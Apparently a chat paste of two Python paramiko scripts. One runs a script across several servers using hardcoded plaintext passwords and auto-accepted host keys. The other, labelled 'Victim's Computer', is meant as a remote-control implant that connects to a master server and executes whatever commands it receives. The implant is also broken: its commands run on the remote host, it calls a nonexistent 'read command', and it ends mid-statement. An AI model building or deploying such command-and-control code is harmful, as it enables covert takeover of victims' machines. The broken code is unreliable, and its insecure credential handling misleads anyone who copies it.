import paramiko

# list of servers to connect to
servers = [{'host':'server1.com', 'user':'user1', 'password':'password1'},
            {'host':'server2.com', 'user':'user2', 'password':'password2'},
            {'host':'server3.com', 'user':'user3', 'password':'password3'}]

# keep track of the number of connected servers
connected_servers = 0

def run_script(host, user, password, script_path):
    global connected_servers
    # create an SSH client
    client = paramiko.SSHClient()

    # add the host key automatically
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # connect to the server
        client.connect(hostname=host, username=user, password=password)
        connected_servers += 1
        print(f'Connected to {host}')
        # run the script
        stdin, stdout, stderr = client.exec_command(f'python {script_path}')

        # print the output
        print(stdout.read().decode())
    except Exception as e:
        print(f'Error connecting to {host}: {e}')
    finally:
        # close the connection
        client.close()

for server in servers:
    run_script(server['host'], server['user'], server['password'], '/path/to/script.py')

print(f'Number of connected servers: {connected_servers}')



[4:19 PM]
Victim’s Computer
import paramiko

# create an SSH client
client = paramiko.SSHClient()

# add the host key automatically
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# connected server counter
counter = 0

try:
    # connect to the main server
    client.connect(hostname='main_server.com', username='main_user', password='main_password')
    counter += 1
    print(f'Connected to main server, connected servers: {counter}')
    # listen for commands
    while True:
        # get the command
        stdin, stdout, stderr = client.exec_command('read command')
        command = stdout.read().decode().strip()

        # check if command is 'exit'
        if command == 'exit':
            counter -= 1
            print(f'Exiting, connected servers: {counter}')
            break

        # execute the command
        stdin, stdout, stderr = client.exec_command(command)

        # print the output
        print(stdout.read().decode())
except Exception as e:
    print(f'Error connecting to main server: {e}')
finally:
    # close the connection
    client
